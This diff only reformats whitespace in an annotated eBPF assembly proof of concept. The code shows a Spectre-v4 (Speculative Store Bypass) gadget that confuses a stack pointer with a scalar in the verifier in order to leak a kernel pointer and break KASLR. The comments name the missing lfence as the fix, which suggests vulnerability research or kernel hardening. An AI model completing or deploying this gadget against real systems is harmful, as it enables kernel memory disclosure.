@@ -215,7 +215,7 @@ LBB0_5:
 	.loc	0 62 13 is_stmt 0               # sockfilter.bpf.c:62:13
 .Ltmp71:
 	#
-    # Gadget for Pointer-as-Scalar Spec. Type Confusion on Stack using SSB
+	# Gadget for Pointer-as-Scalar Spec. Type Confusion on Stack using SSB
 	#
 	# Program state:
 	# r1: skb->ifindex
@@ -225,21 +225,21 @@ LBB0_5:
 	# fp-64: not initialized (type STACK_INVALID)
 	#
 	# Create Spec. Type Confusion:
-    r2 = 0   # scalar Y for type confusion
+	r2 = 0   # scalar Y for type confusion
 	if r1 == 0 goto SCALAR_UNKNOWN # branch based on user input
 	r2 = 1   # needed to prevent dead-code-elim. for secret-based branch
 SCALAR_UNKNOWN:
-    *(u64 *)(r10 - 64) = r6 # fp[-64] = ptr
+	*(u64 *)(r10 - 64) = r6 # fp[-64] = ptr
 	# lfence added here because of ptr-spill to stack.
-    r9 = r10 # fp alias for ssb
+	r9 = r10 # fp alias for ssb
 	#
 	# Imagine dummy bpf_ringbuf_output() here to train alias predictor
 	# for no r9/r10 dependency.
 	#
-    *(u64 *)(r10 - 64) = r2  # fp[-64] = Y: arch. overwrite ptr with scalar, SSB may happen here
+	*(u64 *)(r10 - 64) = r2  # fp[-64] = Y: arch. overwrite ptr with scalar, SSB may happen here
 	# No lfence added here because stack slot was not STACK_INVALID.
 	# To fix this vuln., a lfence should also be added when the slot contained a ptr.
-    r8 = *(u64 *)(r9 - 64) # arch. scalar, spec. ptr
+	r8 = *(u64 *)(r9 - 64) # arch. scalar, spec. ptr
 	#
 	# Leak ptr using cache side-channel, break KASLR.
 	r8 &= 1  # choose bit to leak
